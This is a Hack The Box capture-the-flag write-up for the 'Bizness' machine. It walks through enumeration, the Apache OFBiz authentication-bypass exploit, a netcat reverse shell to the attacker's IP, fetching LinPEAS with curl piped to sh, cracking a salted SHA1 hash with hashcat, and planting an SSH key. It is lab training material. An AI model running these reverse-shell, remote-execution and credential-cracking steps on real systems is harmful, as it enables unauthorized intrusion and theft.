---
date: 2025-03-10
categories: [CTF, HTB]
title: "HTB - Bizness"
tags: ['hashcat', 'nmap', 'privilege escalation', 'python', 'rce', 'reverse shell']

description: "Bizness - A walkthrough of the challenge with enumeration, exploitation and privilege escalation steps."
---

---
---

# HTB - Bizness

NMAP

![image1](../resources/c4c5de538cd64b3980ef74d7ee07df54.png)

- Add **bizness.htb** to /etc/hosts

![image2](../resources/7263dd7c2c5e4f3ebcb3e0cb31d90656.png)


![image3](../resources/9a1adcfedd5e40d1b95f02d12edd408b.png)

- Directory bruteforce (recursive):

```bash
ffuf -u https://bizness.htb/FUZZ -recursion -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fw 1
```

![image4](../resources/708fc8bbb95b450ebd6d2a735a27ac06.png)

- Going to /webportal

![image5](../resources/b81db965335f4cc7a3930c89fbdf7363.png)

- Clicked on Login and used the credentials given but get this error:

![image6](../resources/fb7c0e582dff450b9ad782407ca13fbb.png)

- Go to <https://bizness.htb/myportal>

![image7](../resources/e361a49e029b4ec18f42066c9c3d6dee.png)

- I can register  (**password123**)

![image8](../resources/00adee3881b04c7abcbc7d684ddf7c32.png)
- But can't log in

![image9](../resources/2580e329c5e248e8af9155102ffd736c.png)

- Looking back at the home page - at the bottom:

![image10](../resources/a64ce76f5034402cbb18e0b617b03157.png)

- Googling Apache OFBiz exploit - found:
[https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/blob/master/exploit.py](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/blob/master/exploit.py)

[https://medium.com/@maltamas/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-8ef010759d66](https://medium.com/@maltamas/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467-8ef010759d66)

- Trying the POC to see if it might be vulnerable:
[https://bizness.htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y](https://bizness.htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y)


![image11](../resources/6636619b5fff49bd8ef8dd929fa25cdb.png)


![image12](../resources/6e7d84b355cd4ccca6c2c7d3c2d2dab3.png)

- And using the python tool:

```bash
git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git

python3 exploit.py --url https://bizness.htb

```

![image13](../resources/68434c4ef4a44ce28b21db1bf021240f.png)

- We can also run a command with it - but the command output doesn't get returned:

![image14](../resources/69aa90309cfb464295aaf588e130c940.png)

- I set up a listener:

```bash
rlwrap -cAr nc -lvnp 8081

```
- I tried loads of reverse shell options but the only one that worked was:
**nc -e /bin/bash 10.10.14.18 8081**

```bash
python3 exploit.py --url https://bizness.htb --cmd "nc -e /bin/bash 10.10.14.18 8081"

```

![image15](../resources/49337ed38d6b4b7092516df8aace061f.png)

- Got a shell:

![image16](../resources/4aab46873a5a447b8dc58e1a88cec2ee.png)

- Upgrade shell:

```bash
/usr/bin/script -qc /bin/bash /dev/null
#PRESS Ctrl+Z
stty raw -echo
fg

#PRESS ENTER
#PRESS ENTER

export TERM=xterm
stty cols 236 rows 59
PS1="\n\[\033[1;34m\][\$(date +%H%M)][\u@\h:\w]$\[\033[0m\] "
alias ls='ls --color=auto'
reset
clear

#PRESS ENTER

```

![image17](../resources/1e066e7572af4b488d8095ba17af0168.png)

- Upload LinPEAS:

```bash
curl http://10.10.14.18:8082/linpeas.sh | sh

```

![image18](../resources/8b8ad23a85a245e3a083892b57ead443.png)

```bash
systemctl list-units --type=service --state=running

```

![image19](../resources/ad79a255a6aa4231af2ac46afd785fd5.png)

- Two things stand out:
Normally /opt is empty but in this case it has the directory **ofbiz**

And the service **ofbiz.service**

- Query the service:

```bash
systemctl status ofbiz.service

```

![image20](../resources/3121db77ca6740a3ac8991f2b105a10b.png)

- Search for credentials within /opt/ofbiz:

```bash
grep --color=auto -irnw . -e "credentials" 2>/dev/null

```

![image21](../resources/5852ca65a4d04c3abfcf186abc77783e.png)

```bash
cat /opt/ofbiz/build.gradle

```

![image22](../resources/a702843a884542fba394be3f4fb6966e.png)

```bash
cat /opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml

```

![image23](../resources/ff3b667122034ea3826bfa41613ee3cb.png)

{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a

- We have a SHA1 hash but the hash is for the password ofbiz, that we found before and it doesn't work

- Try and find other hashes:

```bash
grep -E 'SHA' -rnw /opt/ofbiz

```

![image24](../resources/c1bad59dda8f4e5ebea9d450c90f7f74.png)

- More concise grep:

```bash
grep -E '\\SHA\\\[a-zA-Z0-9\]+\\\[a-zA-Z0-9\_-\]+' -rnw .

```

```bash
cat /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat
```

![image25](../resources/fc39e427c2ef41df8fe832816a98ad07.png)

- Found the salt: **d**


![image26](../resources/68f82947e00a436f986365c048ffaa90.png)

- First we need to convert hash to normal base64 encoding by adding padding from URL Safe
and then decode it to hex:

```python
import base64

base64_str = "uP0_QaVBpDWFeo8-dRzDqRwXQ2I"
base64_str_unsafe = base64_str.replace('-', '+').replace('_', '/')
base64_str_padded = base64_str_unsafe + '=' * ((4 - len(base64_str_unsafe) % 4) % 4)
decoded_bytes = base64.b64decode(base64_str_padded)
print(decoded_bytes.hex())

```

![image27](../resources/e5f95b894c744aebbca4a3ca0a525607.png)

- Now, apply mode 120 along with hash and salt format to crack:

```bash
hashcat -m 120 -a0 'b8fd3f41a541a435857a8f3e751cc3a91c174362:d' /usr/share/wordlists/rockyou.txt

```

![image28](../resources/1e13c4c2e2374769866c25380872e965.png)

- Root shell:

![image29](../resources/dc47da71fd44403e83862abd94683c49.png)

- Create SSH key to get better shell:

```bash
ssh-keygen -t rsa -b 4096

chmod 600 id_rsa
mkdir ~/.ssh

touch ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo "\<id_rsa.pub\>" >> ~/.ssh/authorized_keys
ssh ofbiz@10.129.18.39 -i id_rsa
```